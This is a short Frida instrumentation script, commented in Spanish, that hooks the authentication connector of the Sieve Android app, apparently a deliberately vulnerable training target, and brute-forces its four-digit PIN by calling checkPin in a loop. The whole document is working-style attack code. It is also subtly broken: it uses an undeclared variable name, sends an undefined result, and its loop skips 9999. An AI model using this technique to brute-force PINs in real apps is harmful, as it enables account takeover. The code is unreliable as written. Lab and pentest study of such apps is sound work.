Java.perform(function () {
    console.log('[*] Iniciando el bruteforce del PIN');
    var ShortLoginActivity = Java.use('com.mwr.example.sieve.AuthServiceConnector');
    AuthServiceConnector.submit.implementation = function (bypassPIN) {
        var serviceConnect = this.serviceConnection.value
        for (var i=1000; i<9999; i++) {
            var bruteForce = serviceConnect.checkPin(i+"");
            send(i + ": " + result);
        }
        console.log('El PIN ES');
    }});
